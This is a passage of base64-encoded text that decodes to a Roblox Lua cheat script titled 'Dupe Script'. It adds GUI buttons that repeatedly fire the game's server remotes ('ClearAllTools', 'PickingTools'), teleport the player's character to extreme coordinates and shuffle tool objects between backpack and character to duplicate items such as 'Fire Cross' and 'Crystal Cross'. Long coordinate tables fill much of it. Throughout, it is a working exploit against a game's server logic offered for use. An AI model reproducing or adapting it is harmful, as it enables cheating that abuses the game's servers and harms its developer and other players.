ywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTgsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2LCAzLCA1NSksCiAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgNTUpLAogICAgICAgICBWZWN0b3IzLm5ldygyNCAsIDMsIDU1KSwKICAgICAgICAgIFZlY3RvcjMubmV3KDI1ICwgMywgNTUpLAogICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgNTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygyNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC00ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC03ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDkgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDExICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTIgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTUgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTggLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI4LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI2LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI1LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIzLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIyLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxLCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjMsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI0LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyNSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYsIDMsIDE3KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3LCAzLCAxNyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyOCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gTW92ZSB0aGUgdG9vbCB0byB0aGUgcGxheWVyIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNldHRpbmcgdGhlIGdyaXAgcG9zaXRpb24gaW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFNldCB0aGUgZ3JpcCBwb3NpdGlvbiAoR3JpcFBvcykgaWYgdGhlIHRvb2wgaXMgaW4gdGhlIHBsYXllcidzIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbElzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FybihUb29sLCB0b29sLk5hbWUsIGlzIG5vdCBpbiBjaGFyYWN0ZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgRmlyZSBDcm9zcwpUb29sc1RhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gRmlyZSBDcm9zcywKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIG5hbWV0b29scyA9IGNyeXN0YWwgY3Jvc3MgbGVsCiAgICAgICAgbG9jYWwgb2xkY2ZyYW1lID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLCB7CiAgICAgICAgICAgIFRpdGxlID0gRHVwZSBTY3JpcHQsCiAgICAgICAgICAgIFRleHQgPSBQbGVhc2UgZG8gbm90IGVxdWlwIGFueSB0b29scyBvciB1bmVxdWlwIHRvb2xzIG9yIGNsaWNrIHRvb2xzIG9uIGludmVudG9yeS4gSXQgd2lsbCBicmVhayB0aGUgc2NyaXB0LiwKICAgICAgICAgICAgQnV0dG9uMSA9IEkgdW5kZXJzdGFuZCwKICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgfSkKICAgICAgICBsb2NhbCB0b29sdGhhdGl3YW50dG9kdXBlID0gUGFwZXJiYWdGaXJlCiAgICAgICAgbG9jYWwgdG9vbHMgPSBQYXBlcmJhZ0ZpcmUKICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC4xKQogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgIFsxXSA9IENsZWFyQWxsVG9vbHMKICAgICAgICB9CiAgICAgICAgY2xlYXJ0b29scmVtb3RlRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgd2FpdCgwLjMpCiAgICAgICAgbG9jYWwgZHVwaW5nID0gdHJ1ZQogICAgICAgIGZvciBtID0gMSwgNTcgZG8KICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpIHRoZW4KICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICAgICAgWzJdID0gdG9vbHRoYXRpd2FudHRvZHVwZQogICAgICAgICAgICB9CiAgICAgICAgICAgIHBpY2t0b29scmVtb3RlSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tXYWl0Rm9yQ2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sdGhhdGl3YW50dG9kdXBlXUZpbmRGaXJzdENoaWxkKEhhbmRsZSkuTmFtZSA9IEjibmRs6gogICAgICAgICAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICB1bnRpbCBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sdGhhdGl3YW50dG9kdXBlKSA9PSBuaWwKICAgICAgICBlbmQKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpID09IG5pbAogICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgbG9jYWwgdG9vbGdyaXAgPSB0cnVlCiAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICB3YWl0KCkKICAgICAgICBsb2NhbCBncmlwQmFzZSA9IENGcmFtZS5uZXcoLTAuMjkwMDg2NzQ2LCAwLjA3NTU4MTA3MzgsIC0wLjAxMDk4NzI4MTgsIDAuMDQzOTU2MDQxMywgMC41MDk3MDU5MDEsIC0wLjg1OTIyNTA5NCwgLTAuMDU5MTQ1MDYzMiwgLTAuODU3MjIwMTczLCAtMC41MTE1NDIyNjEsIC0wLjk5NzI4MTEzNCwgMC4wNzMzMDQyODA2LCAtMC4wMDc1MzM0MzEwNSkKICAgICAgICBsb2NhbCBncmlwUG9zaXRpb25zID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAwKSwgVmVjdG9yMy5uZXcoMCwgMC41LCAwKSwgVmVjdG9yMy5uZXcoMCwgMSwgMCksIFZlY3RvcjMubmV3KDAsIDEuNSwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDIsIDApLCBWZWN0b3IzLm5ldygwLCAyLjUsIDApLCBWZWN0b3IzLm5ldygwLCAzLCAwKSwgVmVjdG9yMy5uZXcoMCwgMy41LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNCwgMCksIFZlY3RvcjMubmV3KDAsIDQuNSwgMCksIFZlY3RvcjMubmV3KDAsIDUsIDApLCBWZWN0b3IzLm5ldygwLCA1LCAtMSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDUsIC0yKSwgVmVjdG9yMy5uZXcoMCwgNSwgLTMpLCBWZWN0b3IzLm5ldygwLCA1LCAtNCksIFZlY3RvcjMubmV3KDAsIDUsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNSwgLTYpLCBWZWN0b3IzLm5ldygwLCA1LCAtNyksIFZlY3RvcjMubmV3KDAsIDUsIC04KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTkpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA1LCAtMTApLCBWZWN0b3IzLm5ldygwLCA1LjUsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYsIC0xMCksIFZlY3RvcjMubmV3KDAsIDYuNSwgLTEwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNywgLTEwKSwgVmVjdG9yMy5uZXcoMCwgNy41LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LCAtMTApLCBWZWN0b3IzLm5ldygwLCA4LjUsIC0xMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDksIC0xMCksIFZlY3RvcjMubmV3KDAsIDkuNSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xMCksIFZlY3RvcjMubmV3KDAsIDEwLCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDEwLCAtNC41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC00KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0zLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTMpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAxMCwgLTIuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAtMiksIFZlY3RvcjMubmV3KDAsIDEwLCAtMS41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMTAsIC0wLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgMCksIFZlY3RvcjMubmV3KDAsIDksIC01KSwgVmVjdG9yMy5uZXcoMCwgOCwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA3LCAtNSksIFZlY3RvcjMubmV3KDAsIDYsIC01KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTUpLCBWZWN0b3IzLm5ldygwLCA0LCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIC01KSwgVmVjdG9yMy5uZXcoMCwgMiwgLTUpLCBWZWN0b3IzLm5ldygwLCAxLCAtNSksIFZlY3RvcjMubmV3KDAsIDAsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMCwgLTkpLCBWZWN0b3IzLm5ldygwLCAwLCAtOCksIFZlY3RvcjMubmV3KDAsIDAsIC03KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgLTYpCiAgICAgICAgfQogICAgICAgIGZvciBfLCBwb3MgaW4gaXBhaXJzKGdyaXBQb3NpdGlvbnMpIGRvCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IGdyaXBCYXNlICsgcG9zCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IG5hbWV0b29scwogICAgICAgIGVuZAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZnJhbWUKICAgICAgICB3YWl0KDAuNSkKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gbmFtZXRvb2xzIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBCdXR0b24gZm9yIENyeXN0YWwgQ3Jvc3MKVG9vbHNUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IENyeXN0YWwgQ3Jvc3MsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBuYW1ldG9vbHMgPSBjcnlzdGFsIGNyb3NzIGxlbAogICAgICAgIGxvY2FsIG9sZGNmcmFtZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICBnYW1lR2V0U2VydmljZShTdGFydGVyR3VpKVNldENvcmUoU2VuZE5vdGlmaWNhdGlvbiwgewogICAgICAgICAgICBUaXRsZSA9IER1cGUgU2NyaXB0LAogICAgICAgICAgICBUZXh0ID0gUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4sCiAgICAgICAgICAgIEJ1dHRvbjEgPSBJIHVuZGVyc3RhbmQsCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICAgICAgbG9jYWwgdG9vbHRoYXRpd2FudHRvZHVwZSA9IENyeXN0YWwKICAgICAgICBsb2NhbCB0b29scyA9IENyeXN0YWwKICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC4xKQogICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgIFsxXSA9IENsZWFyQWxsVG9vbHMKICAgICAgICB9CiAgICAgICAgY2xlYXJ0b29scmVtb3RlRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICAgICAgZW5kCiAgICAgI